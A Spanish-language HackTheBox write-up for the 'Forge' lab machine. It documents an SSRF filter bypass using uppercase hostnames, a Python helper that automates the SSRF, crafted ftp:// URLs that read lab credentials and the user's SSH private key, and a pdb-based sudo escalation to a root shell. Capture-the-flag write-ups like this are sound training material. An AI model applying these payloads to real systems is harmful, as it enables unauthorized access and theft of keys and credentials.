---
title:  "Forge Writeup [ES] - HackTheBox"
date:   2022-01-22 16:00:00 -0300
categories: [HTB]
toc: true
comments: false
tags: [medium, linux, web, ssrf]
image:
  src: /images/HTB/Forge/00-banner.png
  width: 620   
  height: 410   
---

[Forge](https://app.hackthebox.com/machines/376) es una máquina **Linux** de dificultad media ofrecida por la plataforma de [Hack The Box](https://app.hackthebox.com/). Esta es una de las primeras máquinas que tuve el agrado de resolver cuando aún estaba Activa en la plataforma. 


# Resumen

Forge es una máquina que no consideraría difícil de resolver, es muy intuitiva siempre y cuando se preste atención a las pequeñas pistas. Primero nos encontraremos con un sitio web que permite subir imágenes con dos métodos, desde un archivo local y desde una URL remota. Esta última se puede explotar a través de **SSRF** para acceder a un subdominio que resulta estar bloqueado desde nuestra máquina de atacante. Al consultar este subdominio se nos entrega información adicional para acceder a un FTP junto con sus credenciales, esto nos llevará a descubrir una llave privada SSH para ingresar a Forge con un usuario de bajos privilegios.

Una vez dentro de la máquina, descubriremos unos permisos especiales que permiten ejecutar un script de python como el usuario **root**. Al cabo de un pequeño análisis del script se detecta una librería inusual que permitirá obtener una consola como **root**.



![Info](/images/HTB/Forge/01-info.png)

# Enumeración

## Rustscan / NMAP

Como siempre, se iniciará realizando un escaneo general de los 65535 puertos.

* ```rustscan 10.10.11.111 -- -sC -sV | tee services.nmap```

```plaintext
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
Faster Nmap scanning with Rust.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/rustscan/.rustscan.toml"
[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 1048476'.
Open 10.10.11.111:22
Open 10.10.11.111:80

(...)

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.41
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://forge.htb
Service Info: Host: 10.10.11.111; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

En este caso solo vemos los puertos 22 y 80 abiertos.

## Enumeración web

Iniciando con ```whatweb``` se detecta que la página web redirecciona hacia el nombre DNS ```forge.htb```.

![](/images/HTB/Forge/10-whatweb.png)


![](/images/HTB/Forge/15-web-redirect.png)

Sabiendo esto, lo agregaremos a ```/etc/hosts``` e intentaremos de nuevo.

En su index se encuentra una galería de imágenes y un enlace  en la esquina superior izquierda etiquetado como **Upload an image**.

![](/images/HTB/Forge/20-web-homepage.png)

Intentamos subir una imagen desde el dispositivo local. Esto inicialmente dió la impresión de que se traba de una vulnerabilidad de tipo **Unrestricted file upload** pero luego de una serie de pruebas se comprobó que no era el caso.

![](/images/HTB/Forge/22-image-upload.png)

![](/images/HTB/Forge/23-image-upload-2.png)

El enlace que entrega la web lleva a la ruta donde se almacena dicho archivo, en donde no se puede hacer mucho más.

Ahora utilizando el método **Upload from url** testearemos como se comporta y si es posible explotarlo. Para esta prueba, levantaremos un servidor web con ```php``` para exponer el archivo ```info.php``` y consultarlo desde **forge.htb**

![](/images/HTB/Forge/25-upload-info.php.png)

Al igual que con el otro método, se genera una URL en donde se puede acceder al recurso.

![](/images/HTB/Forge/28-upload-info.php2.png)

Al abrirlo, descubrimos que el archivo existe pero no muestra ningún contenido. Sin embargo, al realizar un ```curl```, vemos el ```phpinfo```. Lo interesante de esto es que no se interpreta el código en la máquina Forge, por lo tanto no funcionará como **RFI**, pero si que permite leer la data de una URL dada.

![](/images/HTB/Forge/30-upload-info.php3.png)

Continuando con la enumeración, se intenta aplicar un fuzzing de directorios con **gobuster** el cual no arroja nuevos directorios.

![](/images/HTB/Forge/35-fuzzing-dir.png)

Para el caso de la enumeración de subdominios utilizaremos ```wfuzz``` y esta vez si obtenemos resultados positivos.

* ```admin.forge.htb```

![](/images/HTB/Forge/38-fuzzing-vhost.png)

Lo consultamos y vemos un texto que nos indica que el recurso es accesible solo de manera local. 

![](/images/HTB/Forge/40-admin.forge.htb.png)

# Server-side request forgery (SSRF)

Ahora que sabemos que ```admin.forge.htb``` solo se puede acceder localmente y tenemos una vía potencial de "leer" URL con la herramienta **upload**, intentaremos consultar este recurso y obtener información.

![](/images/HTB/Forge/45-blacklisted.png)

Y la web nos indica que existe una especie de lista negra que no permite consultar el subdominio admin. 

Luego de unos intentos es posible hacer un bypass de la blacklist al ingresar el nombre con mayúsculas.

![](/images/HTB/Forge/46-bypass.png)

Nuevamente, realizamos una petición **GET** a la URL con ```curl``` y vemos información interesante.

![](/images/HTB/Forge/48-admin-content.png)

Se obtienen dos nuevos endpoint:

* ```admin.forge.htb/announcement```.
* ```admin.forge.htb/upload```.


Se realiza una consulta hacia: ```admin.forge.htb/announcement```.

![](/images/HTB/Forge/50-announcement.png)

Esta página nos indica lo siguiente:

* Existe un ftp interno que se puede acceder con las credenciales: ```user:heightofsecurity123!```.
* El endpoint ```admin.forge.htb/upload``` se puede consultar vía GET con el parámetro ```u``` como argumento y es más permisivo que el anterior, ya que permite contenido desde **ftp** y **ftps**.

Esto nos da una idea bastante clara de lo que se debe hacer a continuación, pero antes, para facilitar la construcción del SSRF, utilizaré un script en python3 que hará todo el proceso más fácil.

Este script automatizará la consulta de la URL que se le pase como argumento, obtendrá el enlace que se genera automáticamente y lo consultará para leer su contenido.

```python
#!/usr/bin/python3
import requests, argparse
from bs4 import BeautifulSoup

parser = argparse.ArgumentParser(
    description="Forge upload script - HTB"
)
parser.add_argument("url", help="Please provide an URL")
args = parser.parse_args()

post_url = "http://forge.htb/upload"
post_data={
    'url': args.url,
    'remote': "1"
}
p = requests.post(post_url, data=post_data)
soup = BeautifulSoup(p.text, 'html.parser')
link = soup.findAll("a")[2].text

print("-"*len(link))
print(link)
print("-"*len(link))

g = requests.get(link)
print(g.text)
```
{: file="upload.py" }

# Acceso inicial

Con toda la información que tenemos, la idea es construir una cadena que haga un **GET** a ```admin.forge.htb/upload``` y le pase como parámetro una string de conexión al **ftp** local. 

Las autenticación al ftp se puede incluir en la misma URL siguiendo esta estructura: 

```plaintext
ftp://<username>:<password>@<host><path>
``` 

* ```python3 upload.py 'http://ADMIN.FORGE.HTB/upload?u=ftp://user:heightofsecurity123!@ADMIN.FORGE.HTB/'```

![](/images/HTB/Forge/55-user-home.png)

Una vez ejecutado el script con nuestra cadena especialmente diseñada, vemos lo que parece ser el **home** del usuario ```user```, ya que se encuentra la flag ```user.txt``` dentro de este directorio.

Sin mucho más explorar dentro de este **ftp**, intenté ingresar por **ssh** con las credenciales obtenidas para recibir el siguiente mensaje: ***user@forge.htb: Permission denied (publickey)***. Esto nos indica que ha sido deshabilitada la autenticación por contraseña para este usuario, por lo tanto, la opción sería ingresar mediante una llave **id_rsa**.

Volviendo al ftp y considerando que no hay otros directorios de interés que sean visibles, podemos suponer que existe el directorio ```.ssh``` y por ende, una ```id_rsa``` dentro de él.


* ```python3 upload.py 'http://ADMIN.FORGE.HTB/upload?u=ftp://user:heightofsecurity123!@ADMIN.FORGE.HTB/.ssh/id_rsa'```

![](/images/HTB/Forge/60-id-rsa.png)

Efectivamente existe una llave para la conexión por **ssh** sin proporcionar contraseña.

* ```ssh -i id_rsa user@forge.htb```

![](/images/HTB/Forge/63-login-as-user.png)

# Escalada de privilegios

Una vez dentro, listando los permisos nos encontramos con el script ```/opt/remote-manage.py``` que nuestro usuario puede ejecutar como  **root**.

![](/images/HTB/Forge/65-sudo-l.png)

```python
#!/usr/bin/env python3
import socket
import random
import subprocess
import pdb

port = random.randint(1025, 65535)

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('127.0.0.1', port))
    sock.listen(1)
    print(f'Listening on localhost:{port}')
    (clientsock, addr) = sock.accept()
    clientsock.send(b'Enter the secret passsword: ')
    if clientsock.recv(1024).strip().decode() != 'secretadminpassword':
        clientsock.send(b'Wrong password!\n')
    else:
        clientsock.send(b'Welcome admin!\n')
        while True:
            clientsock.send(b'\nWhat do you wanna do: \n')
            clientsock.send(b'[1] View processes\n')
            clientsock.send(b'[2] View free memory\n')
            clientsock.send(b'[3] View listening sockets\n')
            clientsock.send(b'[4] Quit\n')
            option = int(clientsock.recv(1024).strip())
            if option == 1:
                clientsock.send(subprocess.getoutput('ps aux').encode())
            elif option == 2:
                clientsock.send(subprocess.getoutput('df').encode())
            elif option == 3:
                clientsock.send(subprocess.getoutput('ss -lnt').encode())
            elif option == 4:
                clientsock.send(b'Bye\n')
                break
except Exception as e:
    print(e)
    pdb.post_mortem(e.__traceback__)
finally:
    quit()
```
{: file="remote-manage.py" }

Por lo que se puede ver en el código, existe una porción en donde posterior a una **excepción**, se gatilla la ejecución de ```pdb```. Sabiendo que el script se ejecuta como el usuario root, esto se puede explotar para lanzar una consola bajo ese contexto privilegiado.

Lo primero que haremos será lanzar dos terminales de SSH con el usuario ```user``` y correr el script en una sesión y conectar desde la otra. La contraseña para la conexión puede ser encontrada dentro del código: ```secretadminpassword```.

![](/images/HTB/Forge/70-remote-manage-script.png)

En este punto ya es posible forzar un error en la ejecución.

1. Desde el cliente se envía una respuesta de tipo ```string```.
2. El server arroja un error ya que se esperaba un ```int```.
3. Tal como se había visto en el código, posterior a una excepción, se lanza una consola de ```pdb```.

![](/images/HTB/Forge/75-script-exploited.png)

Ya solo bastaría lanzar una shell como se haría comunmente en python.

* ```import os; os.system("/bin/bash")```

![](/images/HTB/Forge/80-root.png)

Y eso sería todo para la máquina [Forge](https://app.hackthebox.com/machines/376).

> ¡Happy Hacking and keep grinding!